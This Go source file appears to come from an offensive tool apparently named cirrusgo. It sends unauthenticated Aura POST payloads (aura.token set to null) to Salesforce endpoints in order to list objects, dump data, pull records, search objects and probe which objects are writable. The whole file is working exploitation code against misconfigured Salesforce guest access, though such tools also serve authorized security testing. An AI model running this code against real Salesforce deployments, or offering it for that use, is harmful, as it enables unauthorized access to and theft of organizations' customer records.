package salesforce

import (
	"encoding/json"
	"fmt"
	"log"
	"net/url"
	"regexp"

	"github.com/buger/jsonparser"
	"github.com/logrusorgru/aurora"
	"github.com/projectdiscovery/gologger"
)

func GetObjectList(ResponseGET []byte, url string, foundEndPoint []string, requestProxy string, requestHeaders []string) []string {
	var arrayObjList []string

	payloadMassage := string(PayloadGeneratorObjectList())
	fwuid, app, markup := GetAuraContext(ResponseGET)
	payloadAuraContext := string(PayloadGeneratorAuraContext(fwuid, app, markup))
	requestMethod := "POST"
	requestParameter := map[string]string{"message": payloadMassage, "aura.context": payloadAuraContext, "aura.token": "null"}
	responsebyte := RequestSalesforcePOST(url+foundEndPoint[0], requestMethod, requestProxy, requestHeaders, requestParameter)
	jsonparser.ArrayEach(responsebyte, func(value []byte, dataType jsonparser.ValueType, offset int, err error) {
		jsonvalu, _, _, err := jsonparser.Get(value, "returnValue", "apiNamesToKeyPrefixes")
		if err != nil {
			log.Fatalf("An Error Occured %v", err)
			gologger.Fatal().Msg("Failed to get ObjectList")
		}
		addValu := map[string]string{}
		json.Unmarshal([]byte(jsonvalu), &addValu)
		for k, _ := range addValu {
			arrayObjList = append(arrayObjList, k)
		}
	}, "actions")
	return arrayObjList
}

func GetDump(ResponseGET []byte, url string, foundEndPoint []string, requestProxy string, requestHeaders []string) string {
	//var arrayObjList []string

	payloadMassage := string(PayloadGeneratorDump())
	fwuid, app, markup := GetAuraContext(ResponseGET)
	payloadAuraContext := string(PayloadGeneratorAuraContext(fwuid, app, markup))
	requestMethod := "POST"
	requestParameter := map[string]string{"message": payloadMassage, "aura.context": payloadAuraContext, "aura.token": "null"}
	responsebyte := RequestSalesforcePOST(url+foundEndPoint[0], requestMethod, requestProxy, requestHeaders, requestParameter)
	ss, _, _, _ := jsonparser.Get(responsebyte)
	return string(ss)
}

func GetObjectItems(ResponseGET []byte, url string, foundEndPoint []string, objectName string, pageSize int, page int, requestProxy string, requestHeaders []string) string {
	var data string
	payloadMassage := string(PayloadGeneratorGetItems(objectName, pageSize, page))
	fwuid, app, markup := GetAuraContext(ResponseGET)
	payloadAuraContext := string(PayloadGeneratorAuraContext(fwuid, app, markup))
	requestMethod := "POST"
	requestParameter := map[string]string{"message": payloadMassage, "aura.context": payloadAuraContext, "aura.token": "null"}

	responsebyte := RequestSalesforcePOST(url+foundEndPoint[0], requestMethod, requestProxy, requestHeaders, requestParameter)
	jsonparser.ArrayEach(responsebyte, func(value []byte, dataType jsonparser.ValueType, offset int, err error) {
		jsonvalu, _, _, _ := jsonparser.Get(value, "returnValue", "result")

		data = string(jsonvalu)

	}, "actions")
	return data
}

func GetObjectRecord(ResponseGET []byte, url string, foundEndPoint []string, recodeId string, requestProxy string, requestHeaders []string) string {
	var data string
	payloadMassage := string(PayloadGeneratorGetRecord(recodeId))
	fwuid, app, markup := GetAuraContext(ResponseGET)
	payloadAuraContext := string(PayloadGeneratorAuraContext(fwuid, app, markup))
	requestMethod := "POST"
	requestParameter := map[string]string{"message": payloadMassage, "aura.context": payloadAuraContext, "aura.token": "null"}
	responsebyte := RequestSalesforcePOST(url+foundEndPoint[0], requestMethod, requestProxy, requestHeaders, requestParameter)
	jsonparser.ArrayEach(responsebyte, func(value []byte, dataType jsonparser.ValueType, offset int, err error) {
		jsonvalu, _, _, err := jsonparser.Get(value, "returnValue", "record")
		if err != nil {
			log.Fatalf("An Error Occured %v", err)
			gologger.Fatal().Msg("Failed to get ObjectRecord")
		}
		data = string(jsonvalu)

	}, "actions")
	return data
}

func GetWritableObject(ResponseGET []byte, url string, foundEndPoint []string, objectname string, requestProxy string, requestHeaders []string) string {
	var data string
	payloadMassage := string(PayloadGeneratorWritableOBJ(objectname))
	fwuid, app, markup := GetAuraContext(ResponseGET)
	payloadAuraContext := string(PayloadGeneratorAuraContext(fwuid, app, markup))
	requestMethod := "POST"
	requestParameter := map[string]string{"message": payloadMassage, "aura.context": payloadAuraContext, "aura.token": "null"}

	responsebyte := RequestSalesforcePOST(url+foundEndPoint[0], requestMethod, requestProxy, requestHeaders, requestParameter)
	jsonparser.ArrayEach(responsebyte, func(value []byte, dataType jsonparser.ValueType, offset int, err error) {
		jsonvalu, _, _, err := jsonparser.Get(value, "error")

		data = string(jsonvalu)

	}, "actions")
	return data
}

func GetSearchObjectGetSearchObject(ResponseGET []byte, url string, foundEndPoint []string, objectName string, pageSize int, page int, requestProxy string, requestHeaders []string) string {
	var data string
	payloadMassage := string(PayloadGeneratorSearchObj(objectName, pageSize, page))
	fwuid, app, markup := GetAuraContext(ResponseGET)
	payloadAuraContext := string(PayloadGeneratorAuraContext(fwuid, app, markup))
	requestMethod := "POST"
	requestParameter := map[string]string{"message": payloadMassage, "aura.context": payloadAuraContext, "aura.token": "null"}

	responsebyte := RequestSalesforcePOST(url+foundEndPoint[0], requestMethod, requestProxy, requestHeaders, requestParameter)
	jsonparser.ArrayEach(responsebyte, func(value []byte, dataType jsonparser.ValueType, offset int, err error) {
		jsonvalu, _, _, err := jsonparser.Get(value, "returnValue")
		if err != nil {
			log.Fatalf("An Error Occured %v", err)
			gologger.Fatal().Msg("Failed to get ObjectItems")
		}
		data = string(jsonvalu)

	}, "actions")
	return data
}

//this func get fwuid and markup from (func requestSalesforceGET)
//then return AuraContext for Generator payload
//<link data.*?>([\s\S]*?)<\/.*> backup regex
func GetAuraContext(response []byte) (string, string, string) {

	var fwuid, app, markup string
	responesAuraContext := string(response)
	regexJS := regexp.MustCompile(`<script.*?>([\s\S]*?)<\/script>`).FindAllString(responesAuraContext, -1)
	var temparrayJS []string
	for _, s := range regexJS {

		tempJS, err := url.QueryUnescape(s)
		if err != nil {
			gologger.Fatal().Msg("Can't GET AppName,UID,Markup try manual with flag `cirrusgo salesforce -payload -help`")
		}
		temparrayJS = append(temparrayJS, tempJS)

	}

	for _, v := range temparrayJS {
		fwuid := string(regexp.MustCompile(`"fwuid":"([^"]+)"`).FindString(v))
		app := string(regexp.MustCompile(`"app":"([^"]+)"`).FindString(v))
		markup := string(regexp.MustCompile(`"(APPLICATION@markup[^"]+)":"([^"]+)"`).FindString(v))

		if fwuid != "" && app != "" && markup != "" {
			fmt.Printf("[%s] %s %s\n", aurora.Blue("INFO").String(),
				aurora.White("UID: ").String(), aurora.Blue("["+fwuid+"]").String())
			fmt.Printf("[%s] %s %s\n", aurora.Blue("INFO").String(),
				aurora.White("App Name: ").String(), aurora.Blue("["+app+"]").String())
			fmt.Printf("[%s] %s %s\n", aurora.Blue("INFO").String(),
				aurora.White("Markup: ").String(), aurora.Blue("["+markup+"]").String())
			return fwuid, app, markup

		}
	}

	if fwuid == "" && app == "" && markup == "" {
		gologger.Fatal().Msg("Failed to get AuraContext")
		return "", "", ""
	}

	return fwuid, app, markup
}
